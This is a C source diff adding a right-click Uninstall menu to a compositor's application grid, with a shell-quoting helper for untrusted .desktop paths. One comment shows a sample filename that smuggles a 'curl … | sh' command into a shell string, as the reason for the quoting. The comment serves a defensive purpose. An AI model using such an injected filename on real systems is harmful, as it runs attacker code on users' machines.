@@ -299,6 +299,9 @@ static bool desktop_read(const char *path, const char *id, syn_app_entry_t *e)
 
     memset(e, 0, sizeof(*e));
     snprintf(e->id, sizeof(e->id), "%s", id);
+    /* Kept for the Uninstall row, which has to ask about a FILE — the id folds
+     * '/' to '-' and cannot be turned back into one. */
+    snprintf(e->path, sizeof(e->path), "%s", path);
 
     char line[1024];
     while (fgets(line, sizeof(line), f)) {
@@ -592,10 +595,23 @@ void appgrid_show(syn_server_t *s)
     synui_render_appgrid(s);
 }
 
+/* The context menu, defined below beside the click handling that drives it.
+ * Declared here because appgrid_hide() and appgrid_key() both come first and
+ * both have to be able to take the menu down. */
+static void appgrid_menu_close(syn_server_t *s);
+static int  appgrid_menu_row_at(syn_server_t *s, double lx, double ly);
+static void appgrid_menu_activate(syn_server_t *s, int row);
+
 void appgrid_hide(syn_server_t *s)
 {
     if (!s->appgrid.visible) return;
     s->appgrid.visible = 0;
+    /* ⚠ THE MENU GOES WITH IT. Left standing, menu_open would still be set the
+     * next time the grid opened — a context menu about an application nobody
+     * right-clicked, over a page that may not even contain it any more. */
+    s->appgrid.menu_open = 0;
+    s->appgrid.menu_hover = -1;
+    hit_clear(&s->appgrid.menu_hit);
     synui_render_appgrid(s);
 }
 
@@ -650,6 +666,27 @@ int appgrid_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
      * page that swallowed Super+C would trap you in it. */
     if (mods & (WLR_MODIFIER_LOGO | WLR_MODIFIER_CTRL))
         return 0;
+
+    /* ⚠ THE MENU IS MODAL AND TAKES EVERY KEY, before the switch below rather
+     * than as a case inside it. Left to fall through, typing would go on
+     * editing the search box behind an open menu — refiltering the grid, and
+     * with it moving the tile the menu is about out from under it. Escape is
+     * the one key it answers: it closes the menu and nothing else, so the
+     * search and the page it was opened on are still there. */
+    if (g->menu_open) {
+        if (sym == XKB_KEY_Escape) {
+            appgrid_menu_close(s);
+            synui_render_appgrid(s);
+        } else if (sym == XKB_KEY_Return || sym == XKB_KEY_KP_Enter) {
+            /* Enter acts on the hovered row, and on nothing when the pointer
+             * is elsewhere — the menu has no keyboard selection of its own,
+             * and inventing one that Enter fires blind would put Uninstall on
+             * a key somebody pressed at the grid. */
+            if (g->menu_hover >= 0)
+                appgrid_menu_activate(s, g->menu_hover);
+        }
+        return 1;
+    }
 
     switch (sym) {
     case XKB_KEY_Escape:
@@ -776,6 +813,20 @@ int appgrid_motion(syn_server_t *s, double lx, double ly)
 {
     if (!s->appgrid.visible) return 0;
 
+    /* While the menu is up it takes the pointer, and the tiles under it do NOT
+     * take hover. Otherwise sliding down the menu would walk the selection
+     * across whatever is behind it, and the tile the menu is ABOUT would stop
+     * being the selected one — visible as the highlight wandering off while a
+     * menu about the application sits over it. */
+    if (s->appgrid.menu_open) {
+        int row = appgrid_menu_row_at(s, lx, ly);
+        if (row != s->appgrid.menu_hover) {
+            s->appgrid.menu_hover = row;
+            synui_render_appgrid(s);
+        }
+        return 1;
+    }
+
     int i = appgrid_index_at(s, lx, ly);
     /* Hover moves the selection, as it does on every other panel — but only ONTO
      * a tile. Sliding the pointer across the gap between two tiles must not
@@ -802,11 +853,170 @@ int appgrid_motion(syn_server_t *s, double lx, double ly)
  * application page". Hover worked the whole time, because _motion's signature
  * happened to match.
  */
+/* ── The right-click menu ────────────────────────────────── */
+
+/*
+ * ONE ROW, AND IT IS THE DANGEROUS ONE.
+ *
+ * Nothing has been put beside Uninstall, and that is a decision rather than an
+ * unfinished menu: a context menu whose rows are Open / Pin / Uninstall puts
+ * the destructive row one slot from the two anybody clicks without reading. If
+ * this ever grows, Uninstall goes LAST and behind a separator — the same rule
+ * that put Quit All Windows at the bottom of the dock's menu, and Shut Down
+ * furthest from the hand in the power one.
+ *
+ * ⛔ AND IT DOES NOT ASK WHO OWNS THE APPLICATION FIRST, which the start menu's
+ * version of this row does. The difference is not taste. That menu is
+ * quickshell and can run `synpkg owner` in the background while it draws; this
+ * one is inside the COMPOSITOR, where the answer would have to arrive either by
+ * blocking the input handler — stalling every window on the machine on a
+ * right-click — or by teaching this file to poll a child in the event loop for
+ * one label. So the row is offered, and `synpkg remove --owner` is the thing
+ * that answers: it refuses in the terminal, by name, before it escalates or
+ * touches anything.
+ */
+
+static void appgrid_menu_close(syn_server_t *s)
+{
+    s->appgrid.menu_open = 0;
+    s->appgrid.menu_hover = -1;
+    hit_clear(&s->appgrid.menu_hit);
+}
+
+static void appgrid_menu_open(syn_server_t *s, int app_index, double lx, double ly)
+{
+    syn_appgrid_t *g = &s->appgrid;
+
+    g->menu_app = app_index;
+    g->menu_hover = -1;
+
+    /* ⚠ WHERE THE POINTER WAS, UNCLAMPED. The clamp into the output belongs to
+     * synui_render_appgrid(), which is the only place the output box is known —
+     * get_output_box() is static to render.c — and it writes the clamped
+     * position BACK here so the hit test below and the drawing agree on where
+     * the menu is. A menu hit-tested somewhere it is not drawn is the bug
+     * bar_module_menu.sh exists for, one panel over. */
+    g->menu_x = (int)lx;
+    g->menu_y = (int)ly;
+    g->menu_open = 1;
+    synui_render_appgrid(s);
+}
+
+/* The row under (lx,ly), or -1 for "not on the menu at all".
+ *
+ * ⚠ ASKED OF THE RECTS THE RENDERER ADDED, never of geometry recomputed here.
+ * The menu is clamped into the output at draw time — this file records where
+ * the pointer was and nothing more — so a second sum here would be a second
+ * opinion about where the menu is, and the two would drift the moment the
+ * clamp moved it. That is the bug bar_module_menu.sh exists for, one panel
+ * over: a menu that loaded, had every row, and was simply somewhere else. */
+static int appgrid_menu_row_at(syn_server_t *s, double lx, double ly)
+{
+    syn_appgrid_t *g = &s->appgrid;
+    if (!g->menu_open) return -1;
+    return hit_spot_at(&g->menu_hit, lx, ly);
+}
+
+/*
+ * THE PATH IS UNTRUSTED and synui_spawn() runs /bin/sh -c.
+ *
+ * A .desktop file called
+ *
+ *     game'; curl http://…​ | sh; '.desktop
+ *
+ * is an ordinary filename that survives a download, an unzip or a USB stick,
+ * and this file's entries are read from ~/.local/share/applications among other
+ * places. Single-quoting is what makes the shell take every byte of it
+ * literally; the '\'' dance is the only way to carry a literal quote through.
+ * The same helper crop.c documents at length, and here for the same reason.
+ */
+static void appgrid_shell_quote(const char *in, char *out, size_t n)
+{
+    size_t o = 0;
+    if (n < 3) { if (n) out[0] = '\0'; return; }
+
+    out[o++] = '\'';
+    for (size_t i = 0; in[i] && o + 8 < n; i++) {
+        if (in[i] == '\'') {
+            out[o++] = '\''; out[o++] = '\\'; out[o++] = '\''; out[o++] = '\'';
+        } else {
+            out[o++] = in[i];
+        }
+    }
+    out[o++] = '\'';
+    out[o]   = '\0';
+}
+
+static void appgrid_menu_activate(syn_server_t *s, int row)
+{
+    syn_appgrid_t *g = &s->appgrid;
+    if (row != 0) return;
+    if (g->menu_app < 0 || g->menu_app >= g->count) return;
+
+    char q[1100];
+    appgrid_shell_quote(g->apps[g->menu_app].path, q, sizeof(q));
+
+    /*
+     * A TERMINAL, and deliberately not a silent removal.
+     *
+     * `synpkg remove` is -Rns: it takes the unneeded dependencies and the
+     * config files with it. It prints that list, asks, and authenticates
+     * through polkit — all three need somewhere to happen, and a compositor
+     * has nowhere. Passing --noconfirm here would uninstall an application and
+     * everything it dragged out with it on one right-click and one left click,
+     * with no list and no second thought.
+     *
+     * --hold keeps the output up after it finishes, so a refusal ("nothing owns
+     * this — it did not come from a package") is READ rather than flashed.
+     */
+    char cmd[1400];
+    snprintf(cmd, sizeof(cmd),
+             "syntty --hold -e synpkg remove --owner %s", q);
+
+    /* Closed first, for the reason appgrid_launch() gives: the grid is modal
+     * and holds the keyboard, so a terminal that mapped while it was still up
+     * would arrive behind it and without focus. */
+    appgrid_menu_close(s);
+    appgrid_hide(s);
+    synui_spawn(cmd);
+}
+
 int appgrid_click(syn_server_t *s, double lx, double ly, uint32_t button,
                   uint32_t time_msec)
 {
     (void)time_msec;
     if (!s->appgrid.visible) return 0;
+
+    /* ── the context menu owns every button while it is up ──
+     *
+     * Modal, the same as the dock's and the desktop's. Without this a click
+     * that missed the menu would fall through to the tile underneath and
+     * LAUNCH it — from a menu whose only row is Uninstall, which is the worst
+     * possible pair of outcomes to get one pixel apart. */
+    if (s->appgrid.menu_open) {
+        int row = appgrid_menu_row_at(s, lx, ly);
+        if (button == BTN_LEFT && row >= 0)
+            appgrid_menu_activate(s, row);
+        else
+            appgrid_menu_close(s);
+        synui_render_appgrid(s);
+        return 1;
+    }
+
+    /* ⚠ RIGHT DOES NOT LAUNCH. A context menu that also started the thing it
+     * is about would put the application in front of its own menu. */
+    if (button == BTN_RIGHT) {
+        int i = appgrid_index_at(s, lx, ly);
+        if (i >= 0) {
+            s->appgrid.selected = i;
+            /* filt[] holds indices INTO apps[], and the menu stores the
+             * apps[] one: the search can be retyped while the menu is up,
+             * and a filtered index would then name a different application
+             * than the tile that was right-clicked. */
+            appgrid_menu_open(s, s->appgrid.filt[i], lx, ly);
+        }
+        return 1;
+    }
     if (button != BTN_LEFT) return 1;
 
     int i = appgrid_index_at(s, lx, ly);
